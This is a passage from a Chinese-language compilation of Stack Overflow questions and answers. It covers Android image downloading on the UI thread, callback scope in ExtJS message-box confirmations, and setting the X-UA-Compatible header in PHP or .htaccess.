        httpConn.connect();
        response = httpConn.getResponseCode();
        if (response == HttpURLConnection.HTTP_OK) {
            in = httpConn.getInputStream();
        }
    } catch (Exception ex) {
        throw new IOException("Error connecting");

    }
    return in;
}

private Bitmap DownloadImage(String URL) {
    Bitmap bitmap = null;
    InputStream in = null;

    try {
        in = OpenHttpConnection(URL);
        bitmap = BitmapFactory.decodeStream(in);
        in.close();
    } catch (IOException e1) {
        // TODO Auto-generated catch block
        e1.printStackTrace();
    }
    return bitmap;
} 
```

}

我正在尝试使用来自 url 的位图填充 ImageView。我可以在我的模拟器上连接到互联网，但在 logcat 中它告诉我它无法建立连接。我还在清单中为互联网设置了权限。我对这可能很容易解决的问题感到目瞪口呆。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T00:53:52.383

您正在尝试在 UI 线程上运行网络操作（http 连接）。你应该看看线程和异步任务：http: [//developer.android.com/guide/components/processes-and-threads.html](http://developer.android.com/guide/components/processes-and-threads.html)

# extjs - Extjs - 即使它定义了，我也无法在控制器中存储（MVC）

> ID：15443992
> 
> 赞同：1
> 
> 时间：2013-03-16T00:03:15.587
> 
> 标签：extjs, extjs4, extjs4.1, extjs-mvc

我正在研究 MVC 模式。我有两个功能，一个是工作，另一个是不工作。看看我的控制器代码；

```
Ext.define('MyApp.controller.program', {
    extend: 'Ext.app.Controller',

    stores: [
        'program'
    ],

    deleteWithConfirm: function(button, e, options) {
    var viewList = Ext.ComponentQuery.query('#programGrid')[0];
        var selection = viewList.getSelectionModel().getSelection()[0];
        if(selection)
        {
        Ext.MessageBox.confirm('Confirm', 'Are you sure you want to do that?', 
        function(btn, text ) {
            if(btn == 'yes') {
            console.log('yes clicked');

            this.getProgramStore().remove(selection); //console error message: "TypeError: this.getProgramStore is not a function"
            this.getProgramStore().sync();

            }
            if(btn == 'no') {
            console.log('no clicked');
            }
        }
        );
    }
    },

    justDelete: function(button, e, options) {
        var viewList = Ext.ComponentQuery.query('#programGrid')[0];
        var selection = viewList.getSelectionModel().getSelection()[0];
        if(selection)
        {
            this.getProgramStore().remove(selection);
            this.getProgramStore().sync();
        }
},

init: function(application) {
    this.control({
        "#tombolHapusProgram": {
            click: this.deleteWithConfirm //this is not working

    //click: this.justDelete //this is working
        }
    });
}

}); 
```

justDelete 功能运行良好。但是当我修改该代码并添加一个消息框确认时，即使我定义了 store，该代码也不起作用。

你能告诉我如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-16T00:07:49.907

您需要设置回调的范围：

```
Ext.Msg.confirm('A', 'B', function() {
}, this); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T05:48:44.427

无论如何，您的商店实例都绑定到网格，因此只需执行以下操作：

```
viviewList.getStore().remove(selection) 
```

# php - X-UA 与 HTTP 标头的兼容性

> ID：15443998
> 
> 赞同：5
> 
> 时间：2013-03-16T00:04:41.013
> 
> 标签：php, .htaccess, http, x-ua-compatible

实际上，我在 IE 中的网站存在问题，该网站不在 Intranet 上，并且“始终以兼容模式显示页面未激活”但有时仍以怪异模式打开，尽管添加

```
<meta http-equiv="X-UA-Compatible" content="IE=edge"/> 
```

我有红色，我可以在 HTTP 标头或 htaccess 中发送此兼容性顺序

我的问题是我已经搜索了如何发送 HTTP 标头，但实际上没有发现任何线索，顺便说一句，我是一名 php 开发人员，以防万一需要这些信息。

如果有人能提供我需要添加的内容（两者，或至少一个）以及如何/在哪里添加它，我将非常感激，我一直在寻找整整一周，而且这么快找到修复是非常紧迫的！

这种将其作为 HTTP 标头作为页面第一行发送的方式是否正确？

```
<?php
header('X-UA-Compatible: IE=edge');
?> 
```

（我刚刚找到）

我真的很感激可以提供任何帮助，我提前表示感谢。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-03-16T16:55:13.797

正如您正确指出的，可以在 php 中设置标头：

```
<?php header('X-UA-Compatible: IE=edge,chrome=1'); 
```

也可以这样设置`.htaccess`：

```
<IfModule mod_headers.c>
  Header set X-UA-Compatible "IE=Edge,chrome=1"
  # mod_headers can't match by content-type, but we don't want to send this header on *everything*...
  <FilesMatch "\.(appcache|crx|css|eot|gif|htc|ico|jpe?g|js|m4a|m4v|manifest|mp4|oex|oga|ogg|ogv|otf|pdf|png|safariextz|svg|svgz|ttf|vcf|webm|webp|woff|xml|xpi)$">
    Header unset X-UA-Compatible
  </FilesMatch>
</IfModule> 
```

（复制自[HTML5 Boilerplate](http://html5boilerplate.com/)模板）

**但是**，如果您正在设置这些标头并发现 IE 仍默认为 quirks-mode，那么我倾向于建议还有其他工作在起作用。您是否确保您的页面包含有效的`doctype`. 值得注意的是，**它不是**HTML 4.01 风格的。